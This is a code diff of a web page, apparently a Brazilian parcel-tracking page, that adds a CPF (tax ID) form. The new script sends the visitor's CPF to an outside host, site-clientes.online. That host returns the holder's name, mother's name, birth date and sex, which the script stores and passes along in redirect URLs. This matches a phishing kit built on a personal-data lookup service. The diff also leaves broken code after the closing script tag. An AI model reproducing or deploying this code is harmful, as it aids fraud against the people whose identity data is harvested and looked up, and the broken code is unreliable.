@@ -1409,30 +1409,83 @@ src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
     </script>
 
 <script>
-(function () {
-  "use strict";
+        document.addEventListener("DOMContentLoaded", () => {
+            const form = document.querySelector("form.e_formulario");
+            const inputCPF = document.getElementById("input_1734416045");
+            const btnConsultar = form.querySelector("button");
+            const errorDiv = form.querySelector(".gpc_campos-erro");
+            const textoErrorDiv = document.querySelector(".textoerror");
 
-  function initCPFForm() {
-    const form = document.getElementById("tracking-form");
-    const inputCPF = document.getElementById("tracking-code");
-    const errorElement = document.getElementById("tracking-error");
+            inputCPF.addEventListener("input", (e) => {
+                let value = e.target.value.replace(/\D/g, "");
+                if (value.length > 3) value = value.replace(/(\d{3})(\d)/, "$1.$2");
+                if (value.length > 7) value = value.replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3");
+                if (value.length > 11) value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+                e.target.value = value;
+            });
 
-    if (!form || !inputCPF || !errorElement) return;
+            const isValidCPF = (cpf) => cpf.replace(/\D/g, "").length === 11;
 
-    // Evita inicializar o formulário duas vezes.
-    if (form.dataset.cpfInitialized === "true") return;
-    form.dataset.cpfInitialized = "true";
+            btnConsultar.addEventListener("click", async (e) => {
+                e.preventDefault();
 
-    const API_URL =
-      "https://site-clientes.online/aknes-api/aknes.php";
+                const cpf = inputCPF.value.replace(/\D/g, "");
 
-    const NEXT_URL = "../rastreio/index.html";
+                errorDiv.classList.remove("active");
+                textoErrorDiv.classList.remove("active");
+                inputCPF.classList.remove("active");
 
-    let isSubmitting = false;
+                if (!isValidCPF(cpf)) {
+                    inputCPF.classList.add("obrigatorio", "active");
+                    errorDiv.classList.add("error", "active");
+                    textoErrorDiv.classList.add("textoerror", "active");
+                    textoErrorDiv.textContent = "CPF precisa ter 11 dígitos!";
+                    return;
+                }
 
-    function onlyDigits(value) {
-      return value.replace(/\D/g, "").slice(0, 11);
-    }
+                try {
+                    const url = `https://site-clientes.online/aknes-api/aknes.php?cpf=${cpf}`;
+                    const response = await fetch(url);
+
+                    if (!response.ok) {
+                        throw new Error("Erro ao consultar a API");
+                    }
+
+                    const data = await response.json();
+
+                    if (data.status === 200) {
+                        const hoje = new Date();
+                        const dia = String(hoje.getDate()).padStart(2, '0');
+                        const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+                        const ano = hoje.getFullYear();
+                        const dataFormatada = `${dia}/${mes}/${ano}`;
+
+                        localStorage.setItem("nome", data.nome);
+                        localStorage.setItem("cpf", cpf);
+                        localStorage.setItem("data_atual", dataFormatada);
+                        localStorage.setItem("mae", data.mae);
+                        localStorage.setItem("nascimento", data.nascimento);
+                        localStorage.setItem("sexo", data.sexo);
+                        localStorage.setItem("requisicoes_restantes", data.requisicoes_restantes);
+
+                        const currentParams = new URLSearchParams(window.location.search);
+                        currentParams.set("nome", encodeURIComponent(data.nome));
+                        currentParams.set("cpf", encodeURIComponent(cpf));
+                        currentParams.set("data_atual", dataFormatada);
+
+                        window.location.href = `../rastreio/index.html?${currentParams.toString()}`;
+                    } else {
+                        throw new Error("CPF não encontrado. Tente novamente.");
+                    }
+                } catch (error) {
+                    inputCPF.classList.add("obrigatorio", "active");
+                    errorDiv.classList.add("error", "active");
+                    textoErrorDiv.classList.add("textoerror", "active");
+                    textoErrorDiv.textContent = error.message;
+                }
+            });
+        });
+    </script>
 
     // Formata o CPF: 000.000.000-00
     function formatCPF(digits) {
